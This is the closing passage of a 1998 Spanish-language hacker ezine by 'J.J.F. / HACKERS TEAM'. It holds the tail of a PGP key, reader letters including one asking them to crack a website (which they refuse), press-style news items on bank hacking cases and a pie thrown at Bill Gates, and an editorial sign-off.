G7P/Sx729b78S2O23ZsjAemAJndMkD9GNBOtZM294SwJYm+pHfUC0+Jh2z0l2kjg 
E9THZ2lyrA8lFFkoz9UmTNG7wHJ3CYxEmBLtofro0n8pDBidnsfe9UGrq4HJtj9Z 
4emp6rr6q/7nFvxwrNpBHw1Gkxn5iJzPDkTT5BEABRG0HGFzZXNpbm8gPGFzZXNp 
bm9AYXJyYWtpcy5lcz6JARUDBRA09XQViJzPDkTT5BEBAcm9B/9pq2vTq9vbpW91 
qdIbpz07ae7Ea3mmh4WA0y7/ANvDkGAgwPyZ1CpX3KjkIkfRCiO8buoRH2lPKYi6 
yA95r8slrp0sSElnguIQN6/yulV50jfOsvBB9PrrMg7YIzTtjLqiF7p0QQE8zAce 
ehmSHy3m19Gk3offow1jeFdHwEwIn3JsMsBnU4WM6UaWXXitqWSc0s7HeEQYP1wj 
fB33cmFYbpPZoKSaAoeb0/sA8NlKicD/nCtarwDdqH+2iPP3NGGaBpzMZzXH6JUA 
+s0EUapB2/3Mm1kXXU6FuC9qSYC+fCo9wor+mnUpwp3cSpjI9jV62CrfXkV4IAC8 
YJ/MTb88 
=4SJA 
-----END PGP PUBLIC KEY BLOCK----- 

  <------>

  [ Primero no nos interesa poner el ezine en zip por el momento, ya que asi
    es "llegar y leer" (nuevo concepto informatico, que estamos intentando
    que sea estandarizado por la ISO }:-), la verdad es que lo preferimos asi.
    Ademas la idea es de pillarlo y lo lees en tu ordenador off-line o como
    mas te guste y donde sea sin ningun problema.
    Segundo, de pgp ya sabemos un rato y tenemos ambas versiones que comentas,
    de porque no estan las llaves en el web?? facil, no las hemos puesto,
    pero thx de todas formas y esperamos seguir en esta linea con el web y el
    ezine :) ]

<ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ>

  From: "Ramon Muntane" <rmuntane@xxxxxxxxxxxxxx>   
  To: <jjf_team@hotmail.com>
  Subject: ayuda
  Date: Sat, 28 Feb 1998 22:51:00 +0100

  ->buenas noches. Necesitaria, si ustedes quieren hacer el favor de intentar
  crakear una pagina web, es la siguiente WWW.CONECTA.ES/CEEB muchas gracias

  <------>

  [ Como te lo podria decir para que lo entiendas??, hhhaaaa si, acaso
    tenemos pinta de delincuentes ?? porque eso es delito y nosotros
    "cumplimos la ley" }:-), la proxima vez que quieras enviar un mail
    como este, OLVIDATE DE NOSOTROS, okis ? ]

<ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ>

  Date: Mon, 02 Mar 1998 16:45:47 MDT
  From: "Fernando_Julian_Cejas" <fcejas@xxxxxxxxxxxxxx>
  To: Subject: Soy_fanatico_de_ustedes_compadres? 

  Me llamo Fernando y desde la primera vez que entre en la pagina me gusto
  muchisimo. 
  Que tengan mucha suerte y un gran saludo 

  FERNANDO 

  <------>

  [ Thx a ti por tu apoyo con nosotros ;-)
    Y esperamos que sigas siendo fan nuestro y si te animas nos escribes
    algun articulo.
    Saludos de - J.J.F. / HACKERS TEAM - ]

<ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ>
ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
<ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ>

                           ------------------------
                           - NOTICIAS UNDERGROUND -
                           ------------------------
  
                                                - J.J.F. / HACKERS TEAM -

<ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ>
  RECOMPENSA POR UN HACKER QUE ENTRO EN UN BANCO ALEMAN.

  Date: Sat, 17 Jan 1998 14:10:26 -0500 

        La compa¤ia bancaria alemana Noris Verbraucherbank, ofrecia el sabado
  unos 10.000 o 5.800 marcos, por la captura de un Hacker que amenazaba con
  revelar los codigos secretos de los clientes del banco.

        Este peculiar Hacker exigia un millon de marcos del banco, despues de
  que este cogiera unos 500.000 marcos de las cuentas del banco y accediendo
  a una amplia informacion confidencial, dijo la policia.

        Amenaza con revelar esta informacion confidencial, obtenida mediante
  la copia de los ordenadores en 2 sucursales, si el banco no paga sus
  exigencias.

        El Bild Daily publico una foto del hacker el sabado, nostrando un
  hombre con una edad entre 25 y 35, llevando gafas redondas. La foto fue
  tomada por un cajero automatico.

        Noris Verbrauckerbak es una banca privada adquirida en 1997 por otra
  compa¤ia bancaria, la Bayerische Vereinsbank. Tiene unas 70 sucursales por
  el pais.

<ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ>
  HACKER ACUSADO DE ACTOS HACKING VALORADOS EN $3,7 MILLONES DE DOLARES.

  NEW YORK, Jan. 23 (UPI).

        Un hacker ruso de 30 a¤os sera condenado a 5 a¤os de carcel y por lo
  menos unos $250,000 dolares en multas por haber sustraido unos $4 millones
  de dolares en Citibank.

        La abogada americana Mary Jo White dijo que Vladimir Leonidovich
  Levin consiguio acceso a los ordenadores del banco desde San Petersburgo,
  Russia, usando un programa bancario especial para robar el dinero.

        Levin admitio que transfirio $3,7 millones de las cuentas de los
  clientes hacia otras cuentas controladas por el y otros camaradas. Levin
  sera juzgado el 24 de Febrero.

        Levin entro en las cuentas bancarias mediante un servicio llamado
  Financial Institutions Citibank Case Manager, que Citibank creo en 1994
  para permitir a sus clientes transferir fondos desde sus cuentas a otras
  instituciones financieras en cualquier lugar del mundo.

        Los clientes tienen que meter un codigo de identificacion y una
  contrase¤a para conseguir el acceso a este servicio.

        Levin uso el programa por lo menos unas 18 veces durante el verano
  de 1994 para conseguir acceso en las cuentas de los clientes. Luego 
  transferia los fondos a cuentas que el o sus camaradas controlaban en
  Finlandia, los Estados Unidos, Holanda, Alemania e Israel.

  Nota : Sobre este hacker ya hubo un articulo en el numero 2.

<ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ>
  EL PRIMER HACKER RUSO SENTENCIADO A ...

  YUZHNO-AKHALINSK, January 19 (Itar-Tass)

        Un juzgado en Yuzhno Sakkalinsk en el lejano Este, sentencio el lunes
  al primer hacker ruso acusado por sus actos delictivos y culpables de ello,
  a 3 a¤os en periodo de prueba, dijeron las autoridades de seguridad locales.

        Por otro lado, el Hacker a sido multado con 200 salarios minimos
  (unos 2,800 dolares) y tambien a sido obligado a pagar 1,770 (unos 300
  dolares) a los trabajadores perjudicados por sus actos, dijo la fuente de
  la informacion.

        Una investigacion sobre los actos hacking en los sistemas informaticos
  afectados y una ley que refuerze el cumplimiento de estas normas, fueron
  comenzados en Mayo, dijo el, a¤adiendo que los encargados de seguridad
  garantizan evidencias criminales de que un estudiante universitario esta
  envuelto en entrar en el sistema informatico y pillar informacion de los
  clientes de Sakhmail.

        El Hacker copio informacion comercial e informacion confidencial,
  pero el juzgado no pudo demostrar que vendio esta informacion. Sin embargo,
  los encargados de la seguridad esperan que la sentencia haga reflexionar
  a los intrusos antes de entrar en un sistema informatico sin permiso alguno.

<ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ>
  BILL GATES RECIBE UNA TARTA EN PLENO ROSTRO, EN BRUSELAS.

        "Nada aplazara el lanzamiento del Windows 98 en junio", decia ayer
  Bill Gates, presidente de Microsoft. El rey de la informatica no tuvo que
  esperar tanto para que otro lanzamiento, el de una tarta, hiciera diana en
  su cara y le amargara su visita a Bruselas. El atentado pastelero fue
  reivindicado por el showman Noul Godin, especialista en estos saraos, que
  ya tuvo como victimas al cineasta Godard y al filosofo Bernard-Henri Luvy.
  El ataque a la crema tuvo lugar cuando el magnate iba a dar una conferencia,
  y en el participaron una treintena de personas. Cuatro tartas salieron por
  los aires, y una le dio de lleno a Gates, que no presentara denuncia. 

  Nota : Texto enviado por nuestro lector Cesar.

<ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ>
ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
<ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ>

        Bueno aqui se acaba nuestro tercer numero y espero que os halla
  gustado, como a nosotros hacerlo. Y como seguro haveis podido apreciar
  en cada numero vamos cogiendo mas soltura con lo que producimos un ezine
  de mejor calidad para todos los gustos. Y como aperitivo os dire que ya
  hemos empezado el numero 4 y promete tener articulos muy suculentos para
  todos los hackers, logicamente no sabemos la fecha de salidad del 4 por lo
  que tendreis que esperar, pero hasta dentro de un par de meses nada de
  nada (pero en ese periodo de tiempo iran saliendo otras cosas en el
  web ;-).

  Como siempre digo y nunca parare en repetirme, si quieres decirnos algo,
  escribir un articulo (que estaria muy bien por vuestra parte :),
  criticarnos, sugerencias o cualquier cosa que nos quieras comentar,
  escribe a:

  jjf_team@usa.net

                         ADIOS Y HASTA EL SIGUIENTE NUMERO!!!
                               - J.J.F. / HACKERS TEAM -

-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
